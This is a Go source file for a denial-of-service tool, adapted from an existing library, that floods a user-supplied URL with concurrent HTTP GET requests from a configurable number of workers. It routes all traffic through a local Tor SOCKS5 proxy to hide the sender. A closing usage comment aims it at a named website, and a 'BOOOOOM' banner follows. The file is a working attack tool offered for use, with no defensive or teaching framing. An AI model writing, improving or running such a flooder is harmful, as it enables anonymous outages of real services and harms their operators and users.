//This is an example of Konstantin8105/DDoS attack
//we are adding a tor connection to it

package main

import (
	"flag"
	"fmt"
	"io"
	"io/ioutil"
	"net/http"
	"net/url"
	"runtime"
	"sync/atomic"
	"time"

	"golang.org/x/net/proxy"
)

//Definig the values as struct
type DDoS struct {
	url           string
	stop          *chan bool
	amountWorkers int

	// Statistic
	successRequest int64
	amountRequests int64
}

//initializing the workers
func New(URL string, workers int) (*DDoS, error) {
	if workers < 1 {
		return nil, fmt.Errorf("Amount of workers cannot be less 1")
	}
	u, err := url.Parse(URL)
	if err != nil || len(u.Host) == 0 {
		return nil, fmt.Errorf("Undefined host or error = %v", err)
	}
	s := make(chan bool)
	return &DDoS{
		url:           URL,
		stop:          &s,
		amountWorkers: workers,
	}, nil
}

//creating the workers
func (d *DDoS) Run() {
	torcon, _ := url.Parse("socks5://127.0.0.1:9050")
	pather, _ := proxy.FromURL(torcon, proxy.Direct)
	nwpath := &http.Transport{Dial: pather.Dial}
	client := &http.Client{Transport: nwpath}

	for i := 0; i < d.amountWorkers; i++ {
		go func() {
			for {
				select {
				case <-(*d.stop):
					return
				default:
					// sent http GET requests
					resp, err := client.Get(d.url)
					atomic.AddInt64(&d.amountRequests, 1)
					if err == nil {
						atomic.AddInt64(&d.successRequest, 1)
						_, _ = io.Copy(ioutil.Discard, resp.Body)
						_ = resp.Body.Close()
						fmt.Println(d)
					}
				}
				runtime.Gosched()
			}
		}()
	}
}

func (d *DDoS) Stop() {
	for i := 0; i < d.amountWorkers; i++ {
		(*d.stop) <- true
	}
	close(*d.stop)
}

func (d DDoS) Result() (successRequest, amountRequests int64) {
	return d.successRequest, d.amountRequests
}
func main() {
	workers := flag.Int("workers", 100, "default set to 100")
	urlt := flag.String("url", "", "Include the full  addr with port no")
	flag.Parse()
	d, err := New(*urlt, *workers)
	if err != nil {
		panic(err)
	}
	d.Run()
	time.Sleep(1 * time.Second)
	d.Stop()
}

//usage go run ddos.go -workers=100 -url=http://somethin4chan.com:80

/**************BOOOOOM***********************************/
